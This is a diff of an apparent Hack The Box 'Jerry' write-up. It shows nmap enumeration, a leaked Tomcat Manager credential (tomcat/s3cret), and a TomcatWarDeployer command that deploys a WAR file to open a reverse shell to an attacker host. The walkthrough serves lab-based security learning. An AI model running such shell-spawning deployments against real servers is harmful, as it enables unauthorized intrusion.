@@ -20,9 +20,8 @@ comments: true
 
 Started with enumerating the target with [`NMapAutomator`](https://github.com/21y4d/nmapAutomator) script since it helps in automating all possible ports with vulnerability scripts from `nmap`. Additionally, `NmapAutomator` can help in recon process using `ffuf`, `nikto`, `DNSRecon`, `SMB` enumeration.
 
-> `sudo nmapAutomator.sh -H $IP --type All`
-
 ```bash
+kali $ sudo nmapAutomator.sh -H $IP --type All
 Running all scans on jerry.htb with IP 3(NXDOMAIN)
 No ping detected.. Will not use ping scans!
 Host is likely running Unknown OS!
@@ -79,7 +78,7 @@ Finished nikto scan
 
 #### Suspect 1
 
-If you're familiar with Apache Tomcat and Java (JSP) based development, You'll certainly create a reverse shell out of this `Tomcat Manager` exposed in port `8080` with zero assistance from tooling. After checking the Nikto results, looks like `Tomcat Manager` has been exposed and it has few passwords in `<TOMCAT_HOME>/conf/tomcat-users.xml`. While trying to perform login, the error page actually exposes the password.
+If you're familiar with Apache Tomcat and Java (JSP) based development, You'll certainly create a reverse shell out of this `Tomcat Manager` exposed in port `8080` with zero assistance from tooling. After checking the Nikto results, looks like `Tomcat Manager` has been exposed and it has few passwords in <TOMCAT_HOME>/conf/tomcat-users.xml. While trying to perform login, the error page actually exposes the password.
 
 ![Hackthebox - Jerry VM - Tomcat Manager Password exposure](/assets/media/htb-jerry-enumeration-2.png)
 
@@ -91,7 +90,9 @@ After consuming the password of `tomcat` user as `s3cret`, We're now able to man
 
 Upon scrolling down in the same `Tomcat Manager` page, you may find an option to upload and deploy `war` file. This is where [`TomcatWarDeployer`](https://github.com/mgeeky/tomcatWarDeployer) comes useful. The only caveat was latest python 3.10 wasn't working with the script. I had to do bunch of changes as like `decode('utf-8')` & `encode()` between `str` and `byte` datastructure. This TomcatWarDeployer authenticate with `tomcat` user credentials and upload `jsp_app` and spawns a `reverse shell` in the same terminal.
 
-`> python tomcatWarDeployer.py -U tomcat -P s3cret -H LHOST -p 443 jerry.htb:8080`
+```shell
+kali $ python tomcatWarDeployer.py -U tomcat -P s3cret -H LHOST -p 443 jerry.htb:8080
+```
 
 ![Hackthebox - Jerry VM - Local Shell](/assets/media/htb-jerry-local-shell.png)
 
